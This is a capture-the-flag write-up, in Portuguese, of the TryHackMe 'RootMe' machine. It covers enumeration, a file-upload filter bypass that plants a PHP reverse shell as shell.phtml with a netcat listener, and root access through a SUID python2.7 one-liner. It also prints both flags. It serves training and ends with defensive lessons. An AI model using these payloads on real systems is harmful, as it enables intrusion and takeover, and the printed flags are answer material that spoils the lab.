# RootMe — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details              |
|--------------------|----------------------|
| **Name**           | RootMe               |
| **Platform**       | TryHackMe            |
| **Difficulty**     | Easy                 |
| **OS**             | Linux (Ubuntu 20.04) |
| **Date Completed** | April 2026           |

---

## Attack Chain

```
RECON      →  nmap -sC -sV | gobuster  →  /panel (upload) + /uploads
UPLOAD     →  shell.phtml (bypass .php filter)  →  reverse shell www-data
USER FLAG  →  /var/www/user.txt  →  THM{y0u_g0t_a_sh3ll}
SUID       →  find / -perm -4000  →  /usr/bin/python2.7 (suspeito)
PRIVESC    →  python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'  →  root
ROOT FLAG  →  /root/root.txt  →  THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- -T4 <IP> -oN nmap.txt
```

| Port   | Service | Version       | Note                        |
|--------|---------|---------------|-----------------------------|
| 22/tcp | SSH     | OpenSSH 8.2p1 | —                           |
| 80/tcp | HTTP    | Apache 2.4.41 | Aplicação PHP com upload     |

Dois serviços. SSH sem credenciais imediatas. O HTTP tem título "HackIT" — aplicação customizada, não instalação padrão. O foco é o HTTP.

### Directory Enumeration

```bash
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster.txt
```

| Path        | Status | Observação                              |
|-------------|--------|-----------------------------------------|
| `/panel`    | 301    | Formulário de upload de arquivos        |
| `/uploads`  | 301    | Diretório onde os uploads ficam         |
| `/index.php`| 200    | Página inicial                          |

O par `/panel` + `/uploads` é o vetor imediato: upload de arquivo → execução via URL.

---

## Initial Access

### File Upload — Bypass de Filtro de Extensão

O servidor bloqueou `.php` diretamente. Extensões alternativas que o Apache executa como PHP:

```
.php3   .php4   .php5   .phtml   .pHp   .PHP
```

Payload usado — PHP reverse shell do Kali:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.phtml
# Editar: $ip = '<KALI_IP>'; $port = 4444;
```

Upload em `http://<IP>/panel/` com o arquivo `shell.phtml`.

Listener no Kali:

```bash
nc -lvnp 4444
```

Execução do payload acessando:

```
http://<IP>/uploads/shell.phtml
```

Shell recebida como `www-data`. Estabilização:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-Exploitation

```bash
find / -name "user.txt" 2>/dev/null
# /var/www/user.txt

cat /var/www/user.txt
# THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binário suspeito identificado: `/usr/bin/python2.7`

Python não precisa de SUID para sua função principal — intérprete de scripts não requer privilégios de root. Qualquer linguagem de programação com SUID é escalada direta.

### Exploração via Python2.7 SUID

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

O flag `-p` instrui o shell a preservar o EUID do processo pai (python2.7 com EUID=0), resultando em shell root.

```bash
whoami
# root

cat /root/root.txt
# THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Flags

| File       | Path          | Flag                      |
|------------|---------------|---------------------------|
| `user.txt` | `/var/www/`   | `THM{y0u_g0t_a_sh3ll}`   |
| `root.txt` | `/root/`      | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

## Lições Aprendidas

**Filtros de extensão por lista negra são contornáveis.** Bloquear `.php` sem bloquear `.phtml`, `.php5`, `.pHp` e outras variantes é uma defesa incompleta. A abordagem correta é lista branca — definir explicitamente quais extensões são permitidas, rejeitar todo o resto.

**Python com SUID é RCE como root imediato.** Linguagens de programação com bit SUID são vetores críticos porque permitem executar código arbitrário com os privilégios do dono do arquivo. `os.execl("/bin/sh", "sh", "-p")` spawna um shell que herda o EUID=0 do processo Python, sem precisar de nenhuma vulnerabilidade adicional.

**O par `/panel` + `/uploads` é um padrão de vulnerabilidade comum.** Formulário de upload sem validação adequada combinado com diretório de uploads acessível via web é uma das configurações mais exploradas em aplicações PHP. Sempre enumere diretórios com extensões PHP quando encontrar aplicação web.

```bash
# Comandos de referência — estabilização de shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# SUID enumeration
find / -perm -4000 -type f 2>/dev/null

# Python SUID privesc
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## Tools Used

| Tool                    | Purpose                              |
|-------------------------|--------------------------------------|
| `nmap`                  | Port scanning e detecção de serviços |
| `gobuster`              | Enumeração de diretórios web         |
| `php-reverse-shell.php` | Payload de reverse shell             |
| `netcat`                | Listener para reverse shell          |
| `find`                  | Enumeração de binários SUID          |
| `python2.7`             | Escalada de privilégio via SUID      |

---

## References

- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/) — SUID exploitation
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) — bypass de filtros de extensão

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*